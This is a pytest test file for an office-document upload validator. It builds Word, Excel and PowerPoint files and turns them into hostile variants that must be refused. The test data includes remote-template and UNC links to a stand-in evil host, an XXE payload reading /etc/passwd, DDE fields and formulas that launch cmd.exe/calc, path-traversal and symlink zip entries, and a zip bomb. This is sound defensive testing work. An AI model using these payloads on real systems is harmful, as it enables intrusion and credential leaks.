"""GĐ12 card 12.82b: app/office_files.py = what may leave the workspace as a Drive / OneDrive / Word / Excel upload (and what Gmail / Outlook attach).
In-process, no network, no LLM, $0. Real documents come from python-docx / openpyxl / python-pptx (with a chart), then hostile variants are made by re-zipping them.
Refused (each has its own test): macros (name, vbaProject.bin in a renamed file, macrosheets), external relationships (template URL, UNC, file:, linked image), OLE / ActiveX / externalLinks /
embedded objects, nested archives and programs, zip bombs (decided from the headers WITHOUT inflating), too many entries, XXE (DOCTYPE / ENTITY / UTF-16), path traversal / duplicate / encrypted / symlink
zip entries, DDE, polyglots, extension that does not match the content, cut-off zip, bad base64, a declared MIME that lies, a /workspace path with '..', another workspace's chat file."""
import asyncio, base64, io, os, sys, uuid, zipfile
import pytest

os.environ.setdefault("GOOGLE_API_KEY", "x-not-used")
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "app"))
import deepagent_api as A  # noqa: E402,I001  (must come first: circular imports)
import admin, migrations  # noqa: E402
import attachments as AT, docfiles as D, office_files as OF  # noqa: E402
import workspace_tools as W  # noqa: E402
import workspace_tools_google as G  # noqa: E402

DATA = os.path.join(os.path.dirname(__file__), "data")
REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
RELNS = "http://schemas.openxmlformats.org/package/2006/relationships"
WNS = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
TAG = uuid.uuid4().hex[:6]
WA, WB = 93571, 93572

# ------------------------------------------------------------------ documents
def mk_docx():
    import docx
    d = docx.Document(); d.add_paragraph("Báo cáo tháng 11: doanh thu 1.250.000đ"); b = io.BytesIO(); d.save(b); return b.getvalue()

def mk_xlsx(*cells):
    import openpyxl
    wb = openpyxl.Workbook(); ws = wb.active
    for ref, v in cells: ws[ref] = v
    b = io.BytesIO(); wb.save(b); return b.getvalue()

def mk_pptx(chart=True):
    from pptx import Presentation
    from pptx.chart.data import CategoryChartData
    from pptx.enum.chart import XL_CHART_TYPE
    from pptx.util import Inches
    p = Presentation(); s = p.slides.add_slide(p.slide_layouts[5]); s.shapes.title.text = "Doanh thu"
    if chart:
        cd = CategoryChartData(); cd.categories = ["Q1", "Q2"]; cd.add_series("2026", (1, 2))
        s.shapes.add_chart(XL_CHART_TYPE.COLUMN_CLUSTERED, Inches(1), Inches(2), Inches(6), Inches(4), cd)
    b = io.BytesIO(); p.save(b); return b.getvalue()

def rezip(data, add=(), replace=None, remove=()):
    """Same package with changes: replace={name: bytes}, remove=(names), add=[(name_or_ZipInfo, bytes)] (names may be hostile / duplicated)."""
    replace = replace or {}; out = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(data)) as zi, zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zo:
        for i in zi.infolist():
            if i.filename in remove: continue
            zo.writestr(i.filename, replace.get(i.filename, zi.read(i)))
        for n, b in add: zo.writestr(n, b)
    return out.getvalue()

def rel_items(*items):
    """items = (type, target, external)"""
    return "".join(f'<Relationship Id="rIdX{k}" Type="{t if t.startswith("http") else REL + t}" Target="{tg}"' + (' TargetMode="External"' if ex else "") + "/>" for k, (t, tg, ex) in enumerate(items))

def with_rel(data, rels_path, *items):
    with zipfile.ZipFile(io.BytesIO(data)) as z: cur = z.read(rels_path).decode() if rels_path in z.namelist() else None
    if cur: return rezip(data, replace={rels_path: cur.replace("</Relationships>", rel_items(*items) + "</Relationships>").encode()})
    return rezip(data, add=[(rels_path, f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="{RELNS}">{rel_items(*items)}</Relationships>'.encode())])

def with_doc_xml(data, inner):
    xml = f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="{WNS}"><w:body>{inner}</w:body></w:document>'.encode()
    return rezip(data, replace={"word/document.xml": xml})

def refused(name, data, *words):
    with pytest.raises(W._Err) as e: OF.check(name, data)
    msg = str(e.value).lower()
    for w in words: assert w.lower() in msg, (w, str(e.value))
    return str(e.value)

DOCX, XLSX, PPTX = mk_docx(), mk_xlsx(("A1", "x")), mk_pptx()

# ------------------------------------------------------------------ good files pass
def test_real_documents_are_accepted():
    assert OF.check("bao-cao.docx", DOCX) == D.MIME["docx"]
    assert OF.check("so-lieu.xlsx", XLSX) == D.MIME["xlsx"]
    assert OF.check("trinh-bay.pptx", PPTX) == D.MIME["pptx"]            # has a chart => embeddings/*.xlsx, which is checked recursively
    with zipfile.ZipFile(io.BytesIO(PPTX)) as z: assert any("/embeddings/" in "/" + n and n.endswith(".xlsx") for n in z.namelist())
    assert OF.check("mau.xlsx", open(os.path.join(DATA, "sample_formulas.xlsx"), "rb").read()) == D.MIME["xlsx"]
    assert OF.check("mau.pdf", open(os.path.join(DATA, "md_mau.pdf"), "rb").read()) == "application/pdf"
    assert OF.check("a.txt", "Xin chào\n".encode()) == "text/plain" and OF.check("a.csv", b"a,b\n1,2\n") == "text/csv"
    png = b"\x89PNG\r\n\x1a\n" + b"\0" * 20
    assert OF.check("a.png", png) == "image/png"

def test_hyperlinks_and_wordtemplate_paths_are_normal_and_accepted():
    ok = with_rel(DOCX, "word/_rels/document.xml.rels", ("hyperlink", "https://example.com/bao-gia?id=1", True), ("hyperlink", "mailto:lan@khach.vn", True), ("hyperlink", "#muc2", False))
    assert OF.check("a.docx", ok)
    local_tpl = with_rel(DOCX, "word/_rels/settings.xml.rels", ("attachedTemplate", "file:///C:\\Users\\lan\\Templates\\Normal.dotm", True))
    assert OF.check("a.docx", local_tpl)
    assert OF.check("a.docx", with_doc_xml(DOCX, "<w:p><w:r><w:t>DDE là một giao thức cũ</w:t></w:r></w:p>"))            # the word in TEXT is not a field
    assert OF.check("a.xlsx", mk_xlsx(("A1", "=SUM(B1:B2)"), ("A2", '=IF(B1="a|b",1,2)')))

# ------------------------------------------------------------------ macros
def test_macros_are_refused_by_name_and_by_content():
    xlsm = open(os.path.join(DATA, "sample_macro.xlsm"), "rb").read()
    refused("sample_macro.xlsm", xlsm, "macro")
    refused("renamed.xlsx", xlsm, "macro")                                                                            # renamed: vbaProject.bin / macroEnabled inside
    refused("renamed.docx", xlsm, "macro")
    for ext in ("docm", "dotm", "xlsm", "xlam", "pptm", "ppam"): refused(f"x.{ext}", DOCX, "macro")
    refused("t.docx", rezip(DOCX, add=[("word/vbaProject.bin", b"\x00VBA")]), "macro")
    refused("t.docx", rezip(DOCX, add=[("word/VBAPROJECT.BIN", b"x")]), "macro")                                      # case
    refused("t.xlsx", rezip(XLSX, add=[("xl/macrosheets/sheet1.xml", b"<x/>")]), "macro")                            # Excel 4 macro sheet
    ct = zipfile.ZipFile(io.BytesIO(DOCX)).read("[Content_Types].xml").decode().replace("document.main+xml", "document.macroEnabled.main+xml")
    refused("t.docx", rezip(DOCX, replace={"[Content_Types].xml": ct.encode()}), "macro")

def test_old_binary_office_files_are_refused():
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 512
    refused("a.doc", ole, "not accepted"); refused("a.xls", ole, "docx")
    refused("a.xls", ole + "V\x00B\x00A\x00".encode("latin1"), "macros")
    refused("a.docx", ole, "binary")                                                                                   # OLE under a .docx name

# ------------------------------------------------------------------ external links, OLE, ActiveX
@pytest.mark.parametrize("rels_path,item,word", [
    ("word/_rels/settings.xml.rels", ("attachedTemplate", "http://evil.example/t.dotm", True), "template"),            # remote template injection
    ("word/_rels/settings.xml.rels", ("attachedTemplate", "https://evil.example/t.dotm", False), "template"),          # no TargetMode, still a URL
    ("word/_rels/settings.xml.rels", ("attachedTemplate", "\\\\evil\\share\\t.dotm", True), "template"),               # UNC (NTLM leak)
    ("word/_rels/settings.xml.rels", ("attachedTemplate", "file:////evil/share/t.dotm", True), "template"),
    ("word/_rels/settings.xml.rels", ("attachedTemplate", "file://evil/share/t.dotm", True), "template"),
    ("word/_rels/document.xml.rels", ("image", "http://tracker.example/p.png", True), "external"),                    # linked picture = tracking pixel
    ("word/_rels/document.xml.rels", ("hyperlink", "file:///C:/Windows/System32/calc.exe", True), "hyperlink"),
    ("word/_rels/document.xml.rels", ("hyperlink", "\\\\evil\\share", True), "hyperlink"),
    ("word/_rels/document.xml.rels", ("hyperlink", "javascript:alert(1)", True), "hyperlink"),
    ("word/_rels/document.xml.rels", ("hyperlink", "ms-word:ofe|u|http://evil.example/a.docx", True), "hyperlink"),
    ("word/_rels/document.xml.rels", ("oleObject", "embeddings/oleObject1.bin", False), "oleobject"),
    ("word/_rels/document.xml.rels", ("oleObject", "http://evil.example/o", True), "oleobject"),
    ("word/_rels/document.xml.rels", ("subDocument", "http://evil.example/sub.docx", True), "external"),
    ("word/_rels/document.xml.rels", ("frame", "https://evil.example/f.html", True), "external"),
    ("word/_rels/document.xml.rels", ("vbaProject", "vbaProject.bin", False), "vbaproject"),
    ("word/_rels/document.xml.rels", ("control", "activeX/activeX1.xml", False), "control"),
])
def test_external_and_active_relationships_are_refused(rels_path, item, word):
    refused("a.docx", with_rel(DOCX, rels_path, item), word)

def test_external_workbook_links_ole_and_activex_parts_are_refused():
    refused("a.xlsx", rezip(XLSX, add=[("xl/externalLinks/externalLink1.xml", b"<externalLink/>")]), "externallinks")
    refused("a.xlsx", with_rel(XLSX, "xl/_rels/workbook.xml.rels", ("externalLink", "externalLinks/externalLink1.xml", False)), "externallink")
    refused("a.docx", rezip(DOCX, add=[("word/embeddings/oleObject1.bin", b"\xd0\xcf\x11\xe0\x00")]), "embedded")
    refused("a.docx", rezip(DOCX, add=[("word/embeddings/payload.pdf", b"%PDF-1.4")]), "embedded")
    refused("a.docx", rezip(DOCX, add=[("word/activeX/activeX1.xml", b"<ax/>")]), "activex")
    ct = zipfile.ZipFile(io.BytesIO(DOCX)).read("[Content_Types].xml").decode().replace("</Types>", '<Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/></Types>')
    refused("a.docx", rezip(DOCX, replace={"[Content_Types].xml": ct.encode()}), "ole")

def test_nested_archives_and_programs_are_refused():
    refused("a.docx", rezip(DOCX, add=[("word/media/more.zip", b"PK\x03\x04")]), "archive or program")
    refused("a.docx", rezip(DOCX, add=[("word/media/run.exe", b"MZ")]), "archive or program")
    refused("a.docx", rezip(DOCX, add=[("word/media/image9.png", rezip(DOCX))]), "hidden")                           # a zip that calls itself a picture
    refused("a.docx", rezip(DOCX, add=[("word/media/image9.png", b"MZ\x90\x00\x03")]), "program")
    refused("a.docx", rezip(DOCX, add=[("word/media/image9.png", b"\xd0\xcf\x11\xe0\xa1\xb1")]), "ole")
    inner = rezip(mk_xlsx(("A1", 1)), add=[("xl/embeddings/deep.xlsx", mk_xlsx(("A1", 2)))])
    refused("a.pptx", rezip(PPTX, add=[("ppt/embeddings/second.xlsx", inner)]), "package inside a package")        # only one level of chart data
    refused("a.pptx", rezip(PPTX, add=[("ppt/embeddings/evil.xlsx", rezip(XLSX, add=[("xl/vbaProject.bin", b"x")]))]), "macro")   # embedded workbook is checked like the outer one
    refused("a.pptx", rezip(PPTX, add=[("ppt/embeddings/lying.docx", XLSX)]), "does not match")

# ------------------------------------------------------------------ zip bombs, hostile entries
def test_zip_bomb_is_refused_from_the_headers_without_inflating(monkeypatch):
    bomb = rezip(DOCX, add=[("word/media/bomb.dat", b"\0" * (150 * 1024 * 1024))])
    assert len(bomb) < 2 * 1024 * 1024
    def boom(*a, **k): raise AssertionError("the bomb was inflated")
    monkeypatch.setattr(zipfile.ZipFile, "open", boom); monkeypatch.setattr(zipfile.ZipFile, "read", boom)
    refused("a.docx", bomb, "bomb")

def test_zip_with_too_many_entries_is_refused():
    many = rezip(DOCX, add=[(f"word/media/e{i}.dat", b"") for i in range(D.ZIP_MAX_ENTRIES + 1)])
    refused("a.docx", many, "too many entries")

def test_total_size_limit_and_file_size_limit():
    refused("a.docx", DOCX + b"\0" * (OF.MAX_UPLOAD + 1), "larger than")
    refused("a.docx", b"", "empty")

def test_hostile_zip_entry_names_are_refused():
    for bad in ("../evil.xml", "word/../../evil.xml", "/etc/passwd", "\\windows\\x.xml", "word\\..\\x.xml", "C:/x.xml"):   # (a NUL in a name cannot even be written: ZipInfo cuts the name there)
        refused("a.docx", rezip(DOCX, add=[(bad, b"<x/>")]), "unsafe path")
    refused("a.docx", rezip(DOCX, add=[("word/document.xml", b"<w:document/>")]), "two entries")                      # duplicate main part: scanners and Word could disagree
    refused("a.docx", rezip(DOCX, add=[("WORD/Document.xml", b"<w:document/>")]), "two entries")
    zi = zipfile.ZipInfo("word/link.xml"); zi.external_attr = 0o120777 << 16
    refused("a.docx", rezip(DOCX, add=[(zi, b"/etc/passwd")]), "symbolic link")
    enc = bytearray(DOCX); at = enc.index(b"PK\x01\x02"); enc[at + 8] |= 1
    refused("a.docx", bytes(enc), "encrypted")

# ------------------------------------------------------------------ XXE / DDE
XXE = b'<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/passwd">]><w:document xmlns:w="' + WNS.encode() + b'"><w:body><w:p><w:r><w:t>&x;</w:t></w:r></w:p></w:body></w:document>'

def test_xml_external_entities_and_odd_encodings_are_refused():
    refused("a.docx", rezip(DOCX, replace={"word/document.xml": XXE}), "dtd")
    refused("a.docx", rezip(DOCX, replace={"word/document.xml": b'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "aaaa">]><w:document/>'}), "entity")   # entity bomb
    refused("a.docx", rezip(DOCX, add=[("word/_rels/settings.xml.rels", b'<!DOCTYPE r SYSTEM "http://evil.example/x.dtd"><Relationships/>')]), "dtd")
    refused("a.xlsx", rezip(XLSX, replace={"xl/workbook.xml": XXE}), "dtd")
    refused("a.pptx", rezip(PPTX, replace={"ppt/presentation.xml": XXE}), "dtd")
    refused("a.docx", rezip(DOCX, replace={"word/document.xml": XXE.decode().encode("utf-16")}), "utf-8")                    # UTF-16 hides the DTD from a byte scan
    refused("a.docx", rezip(DOCX, replace={"word/document.xml": XXE.decode().encode("utf-16-le")}), "utf-8")
    refused("a.docx", rezip(DOCX, replace={"word/document.xml": b'<?xml version="1.0" encoding="IBM037"?><d/>'}), "encoding")
    refused("a.docx", rezip(DOCX, replace={"word/document.xml": b"\xef\xbb\xbf" + XXE}), "dtd")                              # BOM does not help

def test_dde_fields_and_formulas_are_refused():
    runs = lambda *t: "<w:p>" + "".join(f"<w:r><w:instrText>{x}</w:instrText></w:r>" for x in t) + "</w:p>"  # noqa: E731
    refused("a.docx", with_doc_xml(DOCX, runs('DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"')), "dde")
    refused("a.docx", with_doc_xml(DOCX, runs("DD", 'EAUTO "calc" ""')), "dde")                                            # split over runs
    refused("a.docx", with_doc_xml(DOCX, runs("&#68;DE calc")), "dde")                                                      # character reference
    refused("a.docx", with_doc_xml(DOCX, f'<x:p xmlns:x="{WNS}"><x:r><x:instrText>DDE calc</x:instrText></x:r></x:p>'.replace("<x:p", "<x:p")), "dde")   # other prefix
    refused("a.docx", with_doc_xml(DOCX, f'<w:fldSimple w:instr="DDEAUTO calc x"><w:r><w:t>a</w:t></w:r></w:fldSimple>'), "dde")
    refused("a.xlsx", mk_xlsx(("A1", "=cmd|'/c calc'!A0")), "dde")
    refused("a.xlsx", mk_xlsx(("A1", "=MSEXCEL|'\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe /c calc.exe'!''")), "dde")

# ------------------------------------------------------------------ type / extension / shape
def test_extension_must_agree_with_content():
    refused("a.xlsx", DOCX, "does not match"); refused("a.docx", PPTX, "does not match"); refused("a.pptx", XLSX, "does not match")
    refused("a.docx", XLSX, "xlsx")
    refused("a", DOCX, "extension")                                                                                        # no extension
    refused("a.zip", DOCX, "extension")
    refused("a.txt", b"\x89PNG\r\n\x1a\n" + b"\0" * 20, "does not match")
    refused("a.jpg", b"\x89PNG\r\n\x1a\n" + b"\0" * 20, "does not match")
    refused("a.docx", b"%PDF-1.4 ...", "not a zip")
    refused("a.xlsx", b"just some text", "not a zip")
    refused("a.exe", b"MZ\x90\x00", "")                                                                                    # unsupported type (docfiles message)

def test_polyglot_template_and_incomplete_packages_are_refused():
    refused("a.docx", rezip(DOCX, add=[("xl/workbook.xml", b"<workbook/>")]), "mixes")
    ct = zipfile.ZipFile(io.BytesIO(DOCX)).read("[Content_Types].xml").decode().replace("document.main+xml", "template.main+xml")
    refused("a.docx", rezip(DOCX, replace={"[Content_Types].xml": ct.encode()}), "template")
    refused("a.docx", rezip(DOCX, remove=("[Content_Types].xml",)), "content_types")
    refused("a.docx", rezip(DOCX, remove=("word/document.xml",)), "main part")

def test_cut_off_zip_names_the_problem():
    refused("a.docx", DOCX[:-60], "missing end-of-central-directory")
    refused("a.xlsx", XLSX[: len(XLSX) // 2], "not a zip")

# ------------------------------------------------------------------ base64
def test_base64_with_newlines_and_no_padding_equals_the_original():
    raw = bytes(range(256)) * 3 + b"\xfb\xff\xfe"                                                                           # has + and / in std, - and _ in url-safe
    std = base64.b64encode(raw).decode(); url = base64.urlsafe_b64encode(raw).decode()
    assert "+" in std and "/" in std and "-" in url and "_" in url and std.endswith("=") or len(raw) % 3 == 0
    wrap = lambda s: "\n".join(s[i:i + 76] for i in range(0, len(s), 76))  # noqa: E731
    for s in (std, wrap(std), std.rstrip("="), wrap(std).rstrip("="), url, url.rstrip("="), wrap(url) + "\r\n", " " + std.replace("A", "A ") + "\n", "data:application/octet-stream;base64," + std):
        assert OF.repair_b64(s) == raw, s[:30]
    assert OF.repair_b64(std.encode()) == raw
    assert OF.repair_b64(base64.b64encode(DOCX).decode()) == DOCX

def test_invalid_base64_names_the_problem():
    for s, word in (("UEsD$AAA", "at char 4"), ("UE sD$", "at char 5"), ("UEsD=AAA", "at char 4"), ("ab+c-d", "mixes"), ("abcde", "cut off"), ("", "empty"), ("   \n", "empty"), ("ünï", "at char 0")):
        with pytest.raises(W._Err) as e: OF.repair_b64(s)
        assert "not valid base64" in str(e.value) and word in str(e.value), (s, str(e.value))

# ------------------------------------------------------------------ prepare_upload (the entry point)
def run(coro): return asyncio.run(coro)

def test_prepare_upload_base64_and_declared_type():
    b64 = base64.b64encode(DOCX).decode()
    name, mime, data = run(OF.prepare_upload("\n".join([b64[:60], b64[60:]]).rstrip("="), "../../Báo cáo?.docx", mime=D.MIME["docx"] + "; charset=x"))
    assert data == DOCX and mime == D.MIME["docx"] and "/" not in name and ".." not in name and name.endswith(".docx")
    assert run(OF.prepare_upload(b64, "a.docx", mime="application/octet-stream"))[2] == DOCX                                # "unknown" is not a lie
    for kw, word in (({"mime": "application/pdf"}, "declared type"), ({"mime": D.MIME["xlsx"]}, "declared type")):
        with pytest.raises(W._Err) as e: run(OF.prepare_upload(b64, "a.docx", **kw))
        assert word in str(e.value)
    for args, word in (((b64, None), "file name"), (("", "a.docx"), "nothing to upload"), ((b64, "a.xlsx"), "does not match"), ((base64.b64encode(DOCX[:-80]).decode(), "a.docx"), "missing end-of-central-directory"),
                       (("!!!notbase64!!!", "a.docx"), "not valid base64"), ((base64.b64encode(rezip(DOCX, replace={"word/document.xml": XXE})).decode(), "a.docx"), "dtd"),
                       ((base64.b64encode(open(os.path.join(DATA, "sample_macro.xlsm"), "rb").read()).decode(), "a.xlsx"), "macro"), ((base64.b64encode(DOCX).decode(), "a.docm"), "macro")):
        with pytest.raises(W._Err) as e: run(OF.prepare_upload(*args))
        assert word in str(e.value).lower(), (args[1:], str(e.value))
    with pytest.raises(W._Err) as e: run(OF.prepare_upload("A" * (OF.MAX_UPLOAD * 4 // 3 + 5000), "a.docx"))              # refused before decoding
    assert "larger than" in str(e.value)

class FBox:
    def __init__(self, files): self.files = files
    async def get(self, p):
        if p not in self.files: raise FileNotFoundError("no such file")
        return self.files[p]

def with_box(monkeypatch, box):
    import sbx_backend
    async def fc(config=None, *, create=True): return box
    monkeypatch.setattr(sbx_backend, "for_config", fc)

def test_prepare_upload_from_the_computer(monkeypatch):
    with_box(monkeypatch, FBox({"/workspace/out/a.docx": DOCX, "/workspace/out/m.docx": rezip(DOCX, add=[("word/vbaProject.bin", b"x")]), "/workspace/out/x.docx": DOCX}))
    name, mime, data = run(OF.prepare_upload("/workspace/out/a.docx")); assert (name, data) == ("a.docx", DOCX) and mime == D.MIME["docx"]
    assert run(OF.prepare_upload("/workspace/out/a.docx", "Tên khác.docx"))[0] == "Tên khác.docx"
    for ref, word in (("/workspace/out/m.docx", "macro"), ("/workspace/../etc/passwd", "'..'"), ("/workspace/out/../../etc/passwd", "'..'"), ("/etc/passwd", "not a zip"), ("/workspace/out/none.docx", "cannot read")):
        with pytest.raises(W._Err) as e: run(OF.prepare_upload(ref, "x.docx"))
        assert word in str(e.value), (ref, str(e.value))
    with pytest.raises(W._Err) as e: run(OF.prepare_upload("/workspace/out/a.docx", "a.xlsx")); assert "does not match" in str(e.value)   # the NEW name is checked too
    with_box(monkeypatch, None)
    with pytest.raises(W._Err) as e: run(OF.prepare_upload("/workspace/out/a.docx"))
    assert "no computer" in str(e.value)

# ------------------------------------------------------------------ chat files: the workspace boundary (real DB + RLS)
def db(fn):
    import psycopg
    from psycopg.rows import dict_row
    from psycopg_pool import AsyncConnectionPool
    pg = os.environ.get("PG_URI", "postgresql://aos:aoslocal@127.0.0.1:5432/agentos"); os.environ.setdefault("PG_URI", pg)
    async def go():
        async with await psycopg.AsyncConnection.connect(pg, autocommit=True) as c: await migrations.run_pending(c)
        async with AsyncConnectionPool(pg, min_size=1, max_size=4, open=False, kwargs={"autocommit": True, "row_factory": dict_row}) as pool:
            await pool.open(); A.S["pool"] = pool; A.S["rls"] = admin.rls_ctx
            for g in ("GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO aos_rls", "GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO aos_rls"):
                for i in range(5):
                    try: await A.q(g); break
                    except psycopg.errors.InternalError_:
                        if i == 4: raise
                        await asyncio.sleep(0.5)
            for w in (WA, WB): await A.q("INSERT INTO workspaces(id,name) VALUES(%s,%s) ON CONFLICT DO NOTHING", (w, f"t1282b-{TAG}-{w}"))
            uid = {k: (await A.q("INSERT INTO users(username,pw_hash) VALUES(%s,'x') RETURNING id", (f"t1282b-{TAG}-{k}",), one=True))["id"] for k in ("alice", "bob")}
            try: return await fn(uid)
            finally:
                await A.q("DELETE FROM chat_files WHERE created_by = ANY(%s)", (list(uid.values()),)); await A.q("DELETE FROM users WHERE username LIKE %s", (f"t1282b-{TAG}-%",))
                await A.q("DELETE FROM crypto_deks WHERE workspace_id = ANY(%s)", ([WA, WB],)); await A.q("DELETE FROM workspaces WHERE id = ANY(%s)", ([WA, WB],))
    return asyncio.run(go())

async def as_(user, fn, *a, **kw):
    tok = admin.USER.set(user)
    try: return await fn(*a, **kw)
    finally: admin.USER.reset(tok)

def test_chat_files_are_checked_and_never_cross_workspaces():
    async def go(uid):
        al = {"id": uid["alice"], "username": "alice", "role": "editor", "ws": WA}; bo = {"id": uid["bob"], "username": "bob", "role": "editor", "ws": WB}
        good = await as_(al, AT.store, DOCX, "Báo cáo.docx"); fid = good["id"]
        hostile = await as_(al, AT.store, with_rel(DOCX, "word/_rels/settings.xml.rels", ("attachedTemplate", "http://evil.example/t.dotm", True)), "mau.docx")
        # the owner's workspace: the clean file passes (3 spellings of the reference), the hostile one is refused even though the chat accepted it
        for ref in (fid, f"/api/files/{fid}", f"file:{fid}"):
            assert (await as_(al, OF.prepare_upload, ref))[2] == DOCX
        with pytest.raises(W._Err) as e: await as_(al, OF.prepare_upload, hostile["id"])
        assert "template" in str(e.value)
        # ANOTHER workspace must not read it: not found, and nothing is returned
        for ref in (fid, f"/api/files/{fid}", hostile["id"]):
            with pytest.raises(W._Err) as e: await as_(bo, OF.prepare_upload, ref, "x.docx")
            assert "not found or not allowed" in str(e.value)
        with pytest.raises(W._Err) as e: await as_(bo, OF.load, [fid], max_total=1 << 20, max_count=3)
        assert "not found or not allowed" in str(e.value)
        # no user and no workspace context (= the unfiltered system context) cannot read a chat file either
        with pytest.raises(W._Err) as e: await OF.prepare_upload(fid, "x.docx")
        assert "not found or not allowed" in str(e.value)
        # unknown id / bad shape
        with pytest.raises(W._Err) as e: await as_(al, OF.prepare_upload, "00000000-0000-4000-8000-000000000000", "x.docx")
        assert "not found" in str(e.value)
        # limits of load(): count and total
        with pytest.raises(W._Err) as e: await as_(al, OF.load, [fid] * 4, max_total=20 << 20, max_count=3)
        assert "too many attachments (max 3)" in str(e.value)
        with pytest.raises(W._Err) as e: await as_(al, OF.load, [fid], max_total=1000, max_count=3)
        assert "larger than" in str(e.value)
    db(go)

# ------------------------------------------------------------------ Gmail keeps using the shared loader with the same texts
def test_gmail_attachment_rules_are_unchanged():
    assert G._load_atts.__module__ == "workspace_tools_google" and G._sniff(b"\x89PNG\r\n\x1a\n" + b"\0" * 8, "a.png") == "image/png"
    assert G._sniff("Xin chào".encode(), "a.txt") == "text/plain"
    with pytest.raises(W._Err) as e: G._sniff(rezip(DOCX, add=[("word/vbaProject.bin", b"x")]), "a.docx")
    assert str(e.value).startswith("attachment a.docx refused:") and "macro" in str(e.value)
    with pytest.raises(W._Err) as e: asyncio.run(G._load_atts(["/workspace/a"] * 11))
    assert str(e.value) == "too many attachments (max 10)"
    with pytest.raises(W._Err) as e: asyncio.run(G._load_atts(["/etc/passwd"]))
    assert "chat file id" in str(e.value) and "/workspace/" in str(e.value)
